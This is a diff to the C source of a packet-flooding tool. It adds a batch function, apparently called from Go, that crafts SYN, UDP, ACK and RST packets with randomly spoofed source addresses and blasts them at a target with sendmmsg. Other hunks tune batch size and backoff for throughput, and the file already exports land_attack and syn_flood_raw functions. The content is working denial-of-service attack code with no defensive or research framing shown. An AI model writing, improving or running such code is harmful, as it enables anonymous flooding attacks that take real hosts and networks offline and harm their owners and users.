@@ -17,7 +17,8 @@
 #include <netdb.h>
 
 #define PKT_MAX 65535
-#define BATCH_SIZE 1024
+#define BATCH_SIZE 4096
+#define MULTI_BATCH 1024    /* smaller than BATCH_SIZE — fits in TLS segment */
 #define MAX_WORKERS 4096
 #define BUF_RING_SZ 65536
 #define BUF_SZ 128
@@ -262,10 +263,10 @@ static void *worker_loop(void *arg) {
     CPU_SET(tid % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
 
-    /* Raise priority to max */
+    /* Normal scheduling — SCHED_FIFO max priority destroys system responsiveness */
     struct sched_param sp;
-    sp.sched_priority = sched_get_priority_max(SCHED_FIFO);
-    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
+    sp.sched_priority = 0;
+    pthread_setschedparam(pthread_self(), SCHED_OTHER, &sp);
 
     /* Open socket */
     int want_raw = (w->method != 1 && w->method != 4);
@@ -357,15 +358,25 @@ static void *worker_loop(void *arg) {
 
         int remaining = batch;
         int off = 0;
+        int eagain_count = 0;
         while (remaining > 0) {
             int ret = sendmmsg(w->sock, msgs + off, remaining, MSG_DONTWAIT);
             if (ret > 0) {
                 __sync_fetch_and_add(&w->sent, ret);
                 off += ret;
                 remaining -= ret;
+                eagain_count = 0;
             } else {
-                /* EAGAIN: kernel buffer full, spin until it drains */
+                /* EAGAIN: kernel buffer full — yield CPU instead of burning it */
                 if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    eagain_count++;
+                    if (eagain_count < 10) {
+                        sched_yield();
+                    } else {
+                        /* Backoff: give kernel time to drain */
+                        struct timespec ts = {0, 100 * 1000L}; /* 100 us */
+                        nanosleep(&ts, NULL);
+                    }
                     continue;
                 }
                 break;
@@ -686,4 +697,119 @@ EXPORT int land_attack(uint32_t target, uint16_t port, int count) {
 
 EXPORT int syn_flood_raw(uint32_t target, uint16_t port, uint32_t spoof, int count) {
     return syn_flood(target, port, spoof, count, 0);
+}
+
+/* ════════════════════════════════════════════════════════════════════════
+ * BATCH C API — send N packets of a given method in a single call.
+ * Eliminates per-packet cgo overhead from Go.
+ * ════════════════════════════════════════════════════════════════════════ */
+
+static __thread unsigned char g_multi_pkt[MULTI_BATCH][128];
+
+EXPORT int multi_send(uint32_t target_ip, uint16_t target_port, int method, int count) {
+    if (g_sock < 0) return -1;
+
+    /* Seed RNG lazily if never seeded by worker_loop */
+    if (g_tid == 0 && g_rng[0][0] == 0) {
+        struct timespec ts;
+        clock_gettime(CLOCK_MONOTONIC, &ts);
+        uint32_t seed = (uint32_t)(ts.tv_nsec ^ (uintptr_t)&g_sock);
+        seed_thread_rng(0, seed);
+    }
+
+    struct sockaddr_in dst;
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(target_port);
+    dst.sin_addr.s_addr = target_ip;
+
+    /* Pre-build SYN template once */
+    if (method == 0 || method == 2 || method == 3) {
+        g_syn_tmpl_valid = 0;
+        build_syn_template(target_ip, target_port);
+    }
+
+    struct mmsghdr msgs[MULTI_BATCH];
+    struct iovec iovecs[MULTI_BATCH];
+
+    int total = 0;
+    while (total < count) {
+        int batch = 0;
+        while (batch < MULTI_BATCH && total + batch < count) {
+            uint32_t src = rand_spoof();
+            char *buf = (char*)g_multi_pkt[batch];
+            int plen;
+
+            switch (method) {
+            case 0: /* SYN */
+                patch_syn(buf, src);
+                plen = g_syn_tmpl.hdr_len;
+                break;
+            case 1: /* UDP */
+            {
+                struct iphdr *ip = (struct iphdr*)buf;
+                struct udphdr *udp = (struct udphdr*)(buf + 20);
+                plen = 20 + 8 + 64;
+                memset(buf, 0, plen);
+                ip->ihl = 5; ip->version = 4;
+                ip->tot_len = htons(plen);
+                ip->id = htons((uint16_t)(xrand() & 0xFFFF));
+                ip->frag_off = htons(0x4000);
+                ip->ttl = 128; ip->tos = 0;
+                ip->protocol = IPPROTO_UDP;
+                ip->saddr = src;
+                ip->daddr = target_ip;
+                { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip;
+                  for (int i = 0; i < 10; i++) ck += w[i];
+                  while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
+                  ip->check = (uint16_t)~ck; }
+                udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
+                udp->dest = htons(target_port);
+                udp->len = htons(8 + 64);
+                udp->check = 0;
+                { uint32_t base = xrand();
+                  for (int j = 0; j < 64; j++)
+                      buf[28 + j] = (base + j * 7) ^ (j * 13); }
+                break;
+            }
+            case 2: /* ACK */
+                patch_syn(buf, src);
+                { struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
+                  tcp->syn = 0; tcp->ack = 1;
+                  tcp->ack_seq = xrand(); }
+                plen = g_syn_tmpl.hdr_len;
+                break;
+            case 3: /* RST */
+                patch_syn(buf, src);
+                { struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
+                  tcp->syn = 0; tcp->rst = 1; }
+                plen = g_syn_tmpl.hdr_len;
+                break;
+            default:
+                return -1;
+            }
+
+            dst.sin_port = htons(target_port);
+            iovecs[batch].iov_base = buf;
+            iovecs[batch].iov_len = plen;
+            msgs[batch].msg_hdr.msg_name = &dst;
+            msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
+            msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
+            msgs[batch].msg_hdr.msg_iovlen = 1;
+            batch++;
+        }
+        if (batch == 0) continue;
+
+        int off = 0, remaining = batch, eagain_cnt = 0;
+        while (remaining > 0) {
+            int ret = (int)sendmmsg(g_sock, msgs + off, remaining, MSG_DONTWAIT);
+            if (ret > 0) { off += ret; remaining -= ret; total += ret; eagain_cnt = 0; }
+            else if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                eagain_cnt++;
+                if (eagain_cnt < 10) { sched_yield(); }
+                else { struct timespec ts = {0, 100 * 1000L}; nanosleep(&ts, NULL); }
+                continue;
+            } else break;
+        }
+    }
+    return total;
 }
